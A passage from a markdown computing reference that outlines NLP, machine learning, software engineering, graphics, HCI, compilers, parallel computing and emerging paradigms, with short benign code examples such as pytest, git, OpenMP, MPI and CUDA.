```
Entities and relationships
Triple: (subject, predicate, object)
Example: (Einstein, bornIn, Germany)

Applications:
- Google Knowledge Graph
- Wikidata
- Enterprise knowledge management
```

## 13.4 Natural Language Processing

### NLP Pipeline
```
1. Tokenization: Split into words/subwords
2. POS Tagging: Identify parts of speech
3. Named Entity Recognition: Find names, places
4. Parsing: Grammatical structure
5. Semantic Analysis: Meaning extraction
```

### Transformers
```
Attention mechanism:
Attention(Q, K, V) = softmax(QK^T / √d_k) V

Self-attention:
- Query, Key, Value from same sequence
- Capture long-range dependencies

Multi-head attention:
- Multiple attention patterns
- Parallel processing
```

### Language Models
```
GPT (Generative Pre-trained Transformer):
- Decoder-only architecture
- Autoregressive generation
- Massive scale (billions of parameters)

BERT (Bidirectional Encoder):
- Encoder-only architecture
- Bidirectional context
- Fine-tune for downstream tasks

T5, BART:
- Encoder-decoder architecture
- Sequence-to-sequence tasks
```

---

# 14. MACHINE LEARNING

## 14.1 ML Fundamentals

### Types of Learning
```
Supervised Learning:
- Labeled data: (input, output) pairs
- Learn mapping: input → output
- Examples: Classification, regression

Unsupervised Learning:
- No labels
- Find structure in data
- Examples: Clustering, dimensionality reduction

Reinforcement Learning:
- Agent interacts with environment
- Learn from rewards/penalties
- Examples: Games, robotics
```

### The Learning Problem
```
Goal: Find hypothesis h that approximates target f

Hypothesis space H: Set of possible hypotheses
Training data D: Sample from unknown distribution
Loss function L: Measure of error

Learning algorithm:
argmin_h Σ L(h(x_i), y_i)  (empirical risk)
```

### Bias-Variance Tradeoff
```
Error = Bias² + Variance + Noise

High Bias (Underfitting):
- Too simple model
- Misses patterns
- High training error

High Variance (Overfitting):
- Too complex model
- Memorizes training data
- Low training error, high test error

Balance: Regularization, cross-validation
```

## 14.2 Supervised Learning

### Linear Regression
```
Model: y = wᵀx + b

Loss: Mean Squared Error
L = (1/n) Σ (y_i - ŷ_i)²

Solution: Closed form or gradient descent
w = (XᵀX)⁻¹Xᵀy
```

### Logistic Regression
```
Model: P(y=1|x) = σ(wᵀx + b)
σ(z) = 1 / (1 + e^(-z))

Loss: Binary Cross-Entropy
L = -Σ [y_i log(ŷ_i) + (1-y_i) log(1-ŷ_i)]
```

### Decision Trees
```
Recursive partitioning of feature space

Split criteria:
- Information gain (entropy)
- Gini impurity
- Variance reduction (regression)

Pruning to prevent overfitting
```

### Ensemble Methods
```
Random Forest:
- Multiple decision trees
- Bagging (bootstrap aggregating)
- Majority vote / average

Gradient Boosting:
- Sequential ensemble
- Each tree corrects previous errors
- XGBoost, LightGBM, CatBoost
```

### Support Vector Machines
```
Find maximum margin hyperplane

Primal: min ||w||² s.t. y_i(wᵀx_i + b) ≥ 1

Kernel trick:
- Linear: K(x,z) = xᵀz
- Polynomial: K(x,z) = (xᵀz + c)^d
- RBF: K(x,z) = exp(-γ||x-z||²)
```

## 14.3 Unsupervised Learning

### K-Means Clustering
```
1. Initialize k centroids
2. Assign points to nearest centroid
3. Update centroids as cluster means
4. Repeat until convergence

Choosing k: Elbow method, silhouette score
```

### Hierarchical Clustering
```
Agglomerative (bottom-up):
1. Each point is a cluster
2. Merge closest clusters
3. Repeat until one cluster

Linkage: Single, complete, average, Ward's
```

### Principal Component Analysis (PCA)
```
Dimensionality reduction

1. Center data: X - μ
2. Compute covariance: Σ = XᵀX / n
3. Eigendecomposition: Σ = VΛVᵀ
4. Project onto top k eigenvectors

Preserves maximum variance
```

### Autoencoders
```
Neural network for compression

Encoder: Input → Latent space
Decoder: Latent space → Reconstruction

Loss: Reconstruction error
Applications: Denoising, anomaly detection
```

## 14.4 Deep Learning

### Neural Networks
```
Layers of interconnected neurons

Forward pass:
h = σ(Wx + b)

Backpropagation:
∂L/∂w = ∂L/∂h · ∂h/∂w (chain rule)

Activation functions:
- ReLU: max(0, x)
- Sigmoid: 1 / (1 + e^(-x))
- Tanh: (e^x - e^(-x)) / (e^x + e^(-x))
- Softmax: e^x_i / Σe^x_j
```

### Convolutional Neural Networks (CNN)
```
For image processing

Convolution: Sliding filter over input
Pooling: Reduce spatial dimensions
Architecture: Conv → Pool → Conv → Pool → FC

Applications:
- Image classification
- Object detection
- Segmentation
```

### Recurrent Neural Networks (RNN)
```
For sequential data

Hidden state: h_t = f(h_{t-1}, x_t)

Vanishing gradient problem:
- Long sequences → gradients vanish
- LSTM: Gated memory cells
- GRU: Simplified gating

Applications:
- Language modeling
- Time series
- Speech recognition
```

### Transformers
```
Attention-based architecture

Self-attention:
- All-to-all connections
- Parallel computation
- Long-range dependencies

Components:
- Multi-head attention
- Position encoding
- Feed-forward layers
- Layer normalization

Applications:
- NLP (GPT, BERT)
- Vision (ViT)
- Multimodal (CLIP)
```

## 14.5 Reinforcement Learning

### Framework
```
Agent interacts with Environment
State s_t → Action a_t → Reward r_t → State s_{t+1}

Goal: Maximize cumulative reward
G_t = Σ γ^k r_{t+k}  (discounted return)
```

### Value Functions
```
State value: V(s) = E[G_t | s_t = s]
Action value: Q(s,a) = E[G_t | s_t = s, a_t = a]

Bellman equations:
V(s) = E[r + γV(s')]
Q(s,a) = E[r + γ max_a' Q(s',a')]
```

### Algorithms
```
Q-Learning:
- Off-policy
- Q(s,a) ← Q(s,a) + α[r + γ max_a' Q(s',a') - Q(s,a)]

Policy Gradient:
- Direct policy optimization
- ∇J(θ) = E[∇log π(a|s) G_t]

Actor-Critic:
- Combine value and policy methods
- Actor (policy) + Critic (value)

Deep RL:
- DQN: Deep Q-Network
- A3C: Asynchronous Actor-Critic
- PPO: Proximal Policy Optimization
```

---

# 15. SOFTWARE ENGINEERING

## 15.1 Development Methodologies

### Waterfall
```
Sequential phases:
Requirements → Design → Implementation → Testing → Deployment

Pros: Clear structure, documentation
Cons: Inflexible, late testing
```

### Agile
```
Iterative, incremental development
Values: Individuals, working software, collaboration, change

Scrum:
- Sprints (2-4 weeks)
- Daily standups
- Sprint planning, review, retrospective
- Roles: Product Owner, Scrum Master, Team

Kanban:
- Visualize workflow
- Limit work in progress
- Continuous flow
```

### DevOps
```
Development + Operations collaboration

CI/CD Pipeline:
Code → Build → Test → Deploy → Monitor

Infrastructure as Code:
- Terraform
- Ansible
- Kubernetes manifests

GitOps:
- Git as source of truth
- Declarative infrastructure
- Automated reconciliation
```

## 15.2 Design Principles

### SOLID
```
S - Single Responsibility: One reason to change
O - Open/Closed: Open for extension, closed for modification
L - Liskov Substitution: Subtypes replaceable for base types
I - Interface Segregation: Many specific interfaces > one general
D - Dependency Inversion: Depend on abstractions, not concretions
```

### Other Principles
```
DRY: Don't Repeat Yourself
KISS: Keep It Simple, Stupid
YAGNI: You Aren't Gonna Need It
Composition over Inheritance
Law of Demeter: Only talk to immediate friends
```

## 15.3 Design Patterns

### Creational Patterns
```
Singleton:
- Single instance, global access
- Thread-safe considerations

Factory Method:
- Create objects without specifying class
- Delegate creation to subclasses

Builder:
- Construct complex objects step by step
- Same construction, different representations

Prototype:
- Clone existing objects
- Avoid expensive creation
```

### Structural Patterns
```
Adapter:
- Convert interface to another
- Legacy system integration

Decorator:
- Add behavior dynamically
- Wrap objects

Facade:
- Simple interface to complex system
- Hide complexity

Proxy:
- Surrogate for another object
- Lazy loading, access control
```

### Behavioral Patterns
```
Observer:
- One-to-many dependency
- Publish-subscribe

Strategy:
- Family of algorithms
- Interchange at runtime

Command:
- Encapsulate request as object
- Undo/redo, queuing

State:
- Change behavior based on state
- State machine implementation
```

## 15.4 Testing

### Testing Pyramid
```
        /\
       /  \      UI Tests (Few)
      /────\
     /      \    Integration Tests
    /────────\
   /          \  Unit Tests (Many)
  /────────────\
```

### Unit Testing
```python
# pytest example
def add(a, b):
    return a + b

def test_add():
    assert add(2, 3) == 5
    assert add(-1, 1) == 0
    assert add(0, 0) == 0

# Test-Driven Development (TDD):
# 1. Write failing test
# 2. Write minimal code to pass
# 3. Refactor
```

### Integration Testing
```
Test component interactions
- API testing
- Database testing
- Service testing

Tools: Postman, pytest, Jest
```

### End-to-End Testing
```
Test entire application flow
- User scenarios
- Browser automation

Tools: Selenium, Cypress, Playwright
```

## 15.5 Version Control

### Git Fundamentals
```bash
# Basic workflow
git init
git add .
git commit -m "message"
git push origin main

# Branching
git branch feature
git checkout feature
git merge feature

# Rebase
git rebase main  # Apply changes on top of main

# Stash
git stash
git stash pop
```

### Git Workflows
```
Feature Branch:
- Main branch always stable
- Feature branches for development
- Merge via pull request

GitFlow:
- Main: Production releases
- Develop: Integration branch
- Feature, release, hotfix branches

Trunk-Based:
- Small, frequent commits to main
- Feature flags for incomplete features
- CI/CD focused
```

---

# 16. COMPUTER GRAPHICS

## 16.1 Fundamentals

### Graphics Pipeline
```
Vertices → Vertex Processing → Rasterization → Fragment Processing → Pixels

1. Vertex Shader: Transform vertices
2. Primitive Assembly: Form triangles
3. Rasterization: Convert to fragments
4. Fragment Shader: Color each fragment
5. Output: Framebuffer
```

### Coordinate Systems
```
Model Space → World Space → View Space → Clip Space → Screen Space

Transformations (4x4 matrices):
- Translation
- Rotation
- Scaling

Projection:
- Orthographic: No perspective
- Perspective: Depth affects size
```

### Color Models
```
RGB: Red, Green, Blue (0-255 each)
HSL: Hue, Saturation, Lightness
HSV: Hue, Saturation, Value
CMYK: Cyan, Magenta, Yellow, Key (print)
```

## 16.2 Rendering

### Rasterization
```
Convert primitives to pixels

Triangle rasterization:
1. Compute bounding box
2. For each pixel in box:
   - Test if inside triangle
   - Interpolate attributes (color, texture)
   - Write to framebuffer
```

### Ray Tracing
```
Simulate light transport

For each pixel:
1. Cast ray from camera through pixel
2. Find intersection with scene
3. Compute lighting at intersection
4. Cast reflection/refraction rays
5. Combine results

Effects: Shadows, reflections, refractions, global illumination
```

### Shading Models
```
Phong Lighting:
I = k_a * I_a + k_d * (L·N) * I_d + k_s * (R·V)^n * I_s

Ambient: Background light
Diffuse: Matte reflection (Lambert's law)
Specular: Shiny highlights

PBR (Physically Based Rendering):
- Energy conservation
- Fresnel effect
- Microfacet theory
```

## 16.3 Texture Mapping

### Basic Texturing
```
Map 2D image onto 3D surface
UV coordinates: (0,0) to (1,1)

Filtering:
- Nearest: Pixelated
- Bilinear: Smooth
- Trilinear: Mipmap interpolation
```

### Advanced Techniques
```
Normal Mapping:
- Store normals in texture
- Add surface detail without geometry

Displacement Mapping:
- Actually modify geometry
- More expensive, more accurate

Environment Mapping:
- Reflect environment
- Cube maps
```

## 16.4 3D Representations

### Meshes
```
Vertices, edges, faces
Triangle mesh most common
Half-edge data structure for topology
```

### Curves & Surfaces
```
Bezier Curves:
P(t) = Σ B_i^n(t) * P_i
Bernstein polynomials

B-Splines:
Local control
NURBS: Rational B-splines
```

### Implicit Surfaces
```
F(x, y, z) = 0
Sphere: x² + y² + z² - r² = 0
Rendering: Ray marching, marching cubes
```

---

# 17. HUMAN-COMPUTER INTERACTION

## 17.1 User Interface Design

### Design Principles
```
Visibility: Functions should be visible
Feedback: Acknowledge user actions
Constraints: Prevent errors
Mapping: Controls match outcomes
Consistency: Similar operations same way
Affordance: Suggest how to use
```

### UI Components
```
Input:
- Buttons, links
- Text fields, forms
- Sliders, toggles
- Dropdowns, menus

Output:
- Labels, text
- Icons, images
- Progress bars
- Notifications

Navigation:
- Menus, tabs
- Breadcrumbs
- Search
```

### Responsive Design
```
CSS Media Queries:
@media (max-width: 768px) { ... }

Approaches:
- Mobile-first
- Fluid grids
- Flexible images
- Breakpoints
```

## 17.2 User Experience

### UX Process
```
1. Research: User interviews, surveys
2. Define: Personas, journey maps
3. Ideate: Brainstorm solutions
4. Prototype: Low-fi to high-fi
5. Test: Usability testing
6. Iterate: Improve based on feedback
```

### Accessibility
```
WCAG Guidelines:
- Perceivable: Alt text, captions
- Operable: Keyboard navigation
- Understandable: Clear language
- Robust: Works with assistive tech

ARIA: Accessible Rich Internet Applications
Screen readers, keyboard navigation
```

## 17.3 Input Devices & Techniques

### Traditional Input
```
Keyboard: Text input, shortcuts
Mouse: Point, click, drag
Touch: Gestures (tap, swipe, pinch)
```

### Alternative Input
```
Voice: Speech recognition
Gesture: Motion tracking
Eye tracking: Gaze-based interaction
Brain-computer interfaces
```

---

# 18. COMPILERS & LANGUAGE PROCESSING

## 18.1 Compilation Phases

```
Source Code
    ↓
┌─────────────────┐
│ Lexical Analysis │  → Tokens
└─────────────────┘
    ↓
┌─────────────────┐
│ Syntax Analysis  │  → AST
└─────────────────┘
    ↓
┌─────────────────┐
│ Semantic Analysis│  → Annotated AST
└─────────────────┘
    ↓
┌─────────────────┐
│ IR Generation    │  → Intermediate Representation
└─────────────────┘
    ↓
┌─────────────────┐
│ Optimization     │  → Optimized IR
└─────────────────┘
    ↓
┌─────────────────┐
│ Code Generation  │  → Machine Code
└─────────────────┘
```

## 18.2 Lexical Analysis

### Tokenization
```
Input: "int x = 42;"

Tokens:
- KEYWORD: int
- IDENTIFIER: x
- OPERATOR: =
- INTEGER: 42
- SEMICOLON: ;
```

### Regular Expressions
```
Pattern matching for tokens
IDENTIFIER: [a-zA-Z_][a-zA-Z0-9_]*
INTEGER: [0-9]+
FLOAT: [0-9]+\.[0-9]+

Implementation: Finite automata
```

## 18.3 Parsing

### Context-Free Grammars
```
E → E + T | T
T → T * F | F
F → ( E ) | id

Derivation: E → E + T → T + T → F + T → id + T → id + F → id + id
```

### Parsing Algorithms
```
Top-Down:
- Recursive descent
- LL(k) parsers

Bottom-Up:
- LR(k) parsers
- LALR (most common)

Parser generators: yacc, bison, ANTLR
```

### Abstract Syntax Tree
```
Input: x = 3 + 4 * 5

        =
       / \
      x   +
         / \
        3   *
           / \
          4   5
```

## 18.4 Semantic Analysis

### Type Checking
```
Static: Compile time (Java, C++)
Dynamic: Runtime (Python, JavaScript)

Type inference:
let x = 5  // x inferred as int
```

### Symbol Tables
```
Track identifiers and their attributes:
- Name
- Type
- Scope
- Memory location
```

## 18.5 Code Generation & Optimization

### Intermediate Representation
```
Three-Address Code:
t1 = 4 * 5
t2 = 3 + t1
x = t2

SSA (Static Single Assignment):
- Each variable assigned once
- Phi functions at joins
```

### Optimizations
```
Local (within basic block):
- Constant folding: 3 + 5 → 8
- Dead code elimination
- Common subexpression elimination

Global (across blocks):
- Loop-invariant code motion
- Inlining
- Tail call optimization

Target-specific:
- Register allocation
- Instruction selection
- Peephole optimization
```

---

# 19. PARALLEL & CONCURRENT COMPUTING

## 19.1 Parallelism Concepts

### Types of Parallelism
```
Data Parallelism:
- Same operation on different data
- SIMD, GPU computing

Task Parallelism:
- Different tasks concurrently
- Pipeline parallelism

Bit-level Parallelism:
- Wider data paths
- 32-bit vs 64-bit
```

### Amdahl's Law
```
Speedup = 1 / (S + P/N)

S = Serial fraction
P = Parallel fraction (1-S)
N = Number of processors

Limit: 1/S as N → ∞
```

### Flynn's Taxonomy
```
SISD: Single Instruction, Single Data (sequential)
SIMD: Single Instruction, Multiple Data (vector)
MISD: Multiple Instruction, Single Data (rare)
MIMD: Multiple Instruction, Multiple Data (multi-core)
```

## 19.2 Shared Memory

### Threading Models
```
POSIX Threads (pthreads):
pthread_create(&thread, NULL, function, arg);
pthread_join(thread, NULL);

OpenMP:
#pragma omp parallel for
for (int i = 0; i < n; i++) {
    // Parallel execution
}
```

### Synchronization
```
Mutex:
- Mutual exclusion
- One thread at a time

Condition Variables:
- Wait for condition
- Signal/broadcast

Barriers:
- Wait for all threads
- Synchronization point

Atomic Operations:
- Lock-free programming
- Compare-and-swap (CAS)
```

### Memory Consistency
```
Sequential Consistency:
- All processors see same order
- Intuitive but expensive

Relaxed Memory Models:
- Reordering allowed
- Memory barriers control order
```

## 19.3 Distributed Memory

### Message Passing
```
MPI (Message Passing Interface):
MPI_Send(data, count, type, dest, tag, comm);
MPI_Recv(data, count, type, source, tag, comm, status);

Collective Operations:
- MPI_Bcast: Broadcast
- MPI_Reduce: Combine
- MPI_Scatter: Distribute
- MPI_Gather: Collect
```

### MapReduce
```
Map: (key, value) → [(key', value')]
Reduce: (key, [values]) → (key, result)

Example: Word count
Map: "hello world" → [("hello", 1), ("world", 1)]
Reduce: ("hello", [1, 1, 1]) → ("hello", 3)
```

## 19.4 GPU Computing

### CUDA Programming
```cuda
__global__ void vector_add(float *a, float *b, float *c, int n) {
    int i = blockIdx.x * blockDim.x + threadIdx.x;
    if (i < n) {
        c[i] = a[i] + b[i];
    }
}

// Launch kernel
vector_add<<<blocks, threads>>>(a, b, c, n);
```

### GPU Architecture
```
SM (Streaming Multiprocessor):
- Multiple cores
- Shared memory
- Warp execution (32 threads)

Memory Hierarchy:
- Registers (fastest)
- Shared memory
- L1/L2 cache
- Global memory (slowest)

Optimization:
- Coalesced memory access
- Avoid bank conflicts
- Maximize occupancy
```

---

# 20. EMERGING COMPUTING PARADIGMS

## 20.1 Quantum Computing

### Quantum Bits (Qubits)
```
Classical bit: 0 or 1
Qubit: α|0⟩ + β|1⟩ (superposition)
|α|² + |β|² = 1

Bloch sphere representation
```

### Quantum Gates
```
Pauli-X (NOT): |0⟩ ↔ |1⟩
Hadamard: |0⟩ → (|0⟩+|1⟩)/√2
CNOT: Controlled-NOT (entanglement)
Phase gates: Add phase to amplitude

Universal gate set: H, T, CNOT
```

### Quantum Algorithms
```
Shor's Algorithm:
- Factor integers in polynomial time
- Threatens RSA encryption

Grover's Algorithm:
- Search in O(√N)
- Quadratic speedup

Quantum Machine Learning:
- Quantum feature maps
- Variational quantum circuits
```

### Current State
```
NISQ Era:
- Noisy Intermediate-Scale Quantum
- 50-100+ qubits
- High error rates
- Limited coherence time

Quantum Error Correction:
- Logical qubits from physical qubits
- Surface codes
- Fault-tolerant quantum computing
```

## 20.2 Neuromorphic Computing

### Concept
```
Brain-inspired computing
Spiking neural networks
Event-driven processing
Massively parallel
```

### Hardware
```
Intel Loihi:
- Neuromorphic research chip
- 128 cores, 1M neurons

IBM TrueNorth:
- 1M neurons, 256M synapses
- Low power consumption

Memristors:
- Memory + computing
- Analog weights
```

## 20.3 Edge Computing

### Architecture
```
Cloud ──────── Edge ──────── Device

Edge benefits:
- Lower latency
- Reduced bandwidth
- Privacy (local processing)
- Reliability (works offline)
```

### Technologies
```
Fog Computing:
- Intermediate layer
- Pre-processing at edge

IoT Edge:
- Raspberry Pi, NVIDIA Jetson
- TensorFlow Lite, Edge TPU

5G MEC:
- Multi-access Edge Computing
- Network edge processing
```

## 20.4 Biological Computing

### DNA Computing
```
Data storage: 1 gram DNA = 215 PB
Massively parallel
Slow but energy efficient
Applications: Archival storage
```

### Wetware
```
Living cells as computers
Genetic circuits
Synthetic biology
```

## 20.5 Optical Computing

### Photonic Computing
```
Light instead of electrons
Faster, lower power
Parallel processing (wavelength)
Challenges: Integration, nonlinearity
```

### Optical Neural Networks
```
Matrix multiplication with light
Mach-Zehnder interferometers
Photonic tensor cores
```

---

# SUMMARY

This document covers the breadth and depth of computing knowledge:

1. **Theoretical Foundations**: Computation theory, information theory
2. **Hardware**: CPU architecture, memory, digital logic
3. **Systems**: Operating systems, networking, distributed systems
4. **Software**: Languages, algorithms, data structures
5. **Data**: Databases, storage, retrieval
6. **Security**: Cryptography, vulnerabilities, protection
7. **Intelligence**: AI, machine learning, NLP
8. **Engineering**: Development practices, testing, design
9. **Interaction**: Graphics, HCI, user experience
10. **Future**: Quantum, neuromorphic, edge computing

Computing is vast and continuously evolving. This reference provides the foundation for understanding and building upon humanity's computational knowledge.

---

*Last Updated: 2024*
*Coverage: Complete Earth Computing Knowledge*
